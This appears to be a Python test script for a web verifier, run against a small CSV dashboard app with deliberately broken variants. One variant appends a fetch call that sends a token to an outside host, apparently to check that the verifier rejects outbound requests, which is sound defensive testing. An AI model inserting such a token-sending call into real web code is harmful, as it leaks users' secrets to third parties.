"""CSV assertions use the production verifier and its exact retained snapshot."""

from pathlib import Path
from tempfile import TemporaryDirectory
from web_verifier_smoke import REPO, record, verify


CHECKS = REPO / "tests/cli/csv_dashboard_followup_checks.json"


def main():
    with TemporaryDirectory(prefix="rna-csv-checks-") as folder:
        root = Path(folder) / "work"
        root.mkdir()
        state = Path(folder) / "state"
        (root / "index.html").write_text(
            '<!doctype html><link rel="stylesheet" href="styles.css">'
            '<input type="file" id="csv-file"><select id="category-filter">'
            '<option value="all">All</option></select><button id="sort-amount">Sort</button>'
            '<input type="number" id="min-amount" value="0"><table><tbody id="rows">'
            '</tbody></table><span id="total"></span><svg id="chart"></svg>'
            '<button id="export">Export</button><p id="status"></p>'
            '<script src="app.js"></script>', encoding="utf-8")
        (root / "styles.css").write_text("body { font-family: sans-serif; }", encoding="utf-8")
        script = root / "app.js"
        script.write_text(
            """let data=[];let direction=0;const q=id=>document.getElementById(id);
function visible(){return data.filter(r=>(q('category-filter').value==='all'||r[1]===q('category-filter').value)&&r[2]>=Number(q('min-amount').value||0)).sort((a,b)=>direction*(a[2]-b[2]))}
function render(){const rows=visible();q('rows').innerHTML=rows.map(r=>'<tr><td>'+r[0]+'</td><td>'+r[1]+'</td><td>'+r[2]+'</td></tr>').join('');q('total').textContent=String(rows.reduce((a,r)=>a+r[2],0));q('chart').innerHTML=rows.map((r,i)=>'<rect x="'+(i*20)+'" y="0" width="10" height="'+r[2]+'"></rect>').join('')}
q('csv-file').addEventListener('change',async e=>{const text=await e.target.files[0].text();if(!text.trim()){q('status').textContent='Empty CSV';data=[];render();return}const lines=text.trim().split(/\\r?\\n/).map(x=>x.split(','));if(lines[0].join(',')!=='name,category,amount'||lines.slice(1).some(r=>r.length!==3||!Number.isFinite(Number(r[2])))){q('status').textContent='Invalid CSV';data=[];render();return}q('status').textContent='';data=lines.slice(1).map(r=>[r[0],r[1],Number(r[2])]);q('category-filter').innerHTML='<option value="all">All</option>'+[...new Set(data.map(r=>r[1]))].map(x=>'<option value="'+x+'">'+x+'</option>').join('');render()});
q('category-filter').addEventListener('change',render);q('sort-amount').addEventListener('click',()=>{direction=direction===1?-1:1;render()});q('min-amount').addEventListener('input',render);
q('export').addEventListener('click',()=>{const csv='name,category,amount\\n'+visible().map(r=>r.join(',')).join('\\n')+'\\n';const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([csv],{type:'text/csv'}));a.download='visible.csv';a.click();setTimeout(()=>URL.revokeObjectURL(a.href),1000)});
""", encoding="utf-8")
        code, report = verify(root, state, checks=CHECKS)
        assert code == 0 and report["status"] == "passed", report
        assert len(report["checks"]) == 31 and all(item['status'] == 'Passed' for item in report['checks']), report
        assert sorted(report['checkedFiles']) == ['app.js', 'index.html', 'styles.css'], report
        saved = record(root, state, report['verificationId'])
        assert saved['CheckResults'] == report['checks'] and len(saved['Checks']['steps']) == 31, saved
        assert not list(root.glob('*.csv')), 'Fixtures/downloads must stay outside the writable project'

        code, missing = verify(root, state, browser="/missing/chromium", checks=CHECKS)
        assert code == 4 and missing["status"] == "not-run", missing
        assert all(item['status'] == 'NotRun' for item in missing['checks']), missing

        working = script.read_text(encoding="utf-8")
        # A valid UI with incorrect downloads/plot data must fail an assertion,
        # even without JS or console errors. Later assertions remain NotRun.
        for broken, failed_id in [
            (working.replace('visible().map(r=>r.join', 'data.map(r=>r.join'), 'filtered-export'),
            (working.replace('a.click();', 'a.click();a.click();'), 'filtered-export'),
            (working.replace("height=\"'+r[2]+'", "height=\"'+10+'"), 'filtered-chart'),
            (working.replace('direction*(a[2]-b[2])', 'direction*String(a[2]).localeCompare(String(b[2]))'), 'ascending'),
        ]:
            assert broken != working
            script.write_text(broken, encoding='utf-8')
            code, rejected = verify(root, state, checks=CHECKS)
            assert code == 5, rejected
            failed = [item['id'] for item in rejected['checks'] if item['status'] == 'Failed']
            assert failed == [failed_id], rejected
            assert record(root, state, rejected['verificationId'])['CheckResults'] == rejected['checks']

        script.write_text(working + "\nfetch('https://example.invalid/private?token=hidden').catch(()=>{});\n",
                          encoding="utf-8")
        code, outbound = verify(root, state, checks=CHECKS)
        assert code == 5 and outbound['errors'], outbound

        script.write_text('throw new Error("broken fixture")', encoding="utf-8")
        code, broken = verify(root, state, checks=CHECKS)
        assert code == 5 and any("broken fixture" in error for error in broken['errors']), broken
        (root / 'styles.css').unlink()
        code, historical = verify(root, state, snapshot=report['snapshotId'], checks=CHECKS)
        assert code == 0 and historical['historical'], historical
        assert historical['snapshotSha256'] == report['snapshotSha256'] and len(historical['checks']) == 31, historical
        assert record(root, state, report['verificationId']) == saved
        print("PASS CSV checks: 31 assertions on exact snapshot; wrong export/chart/sort, missing browser, outbound and broken JS rejected; historical replay")


if __name__ == "__main__":
    main()
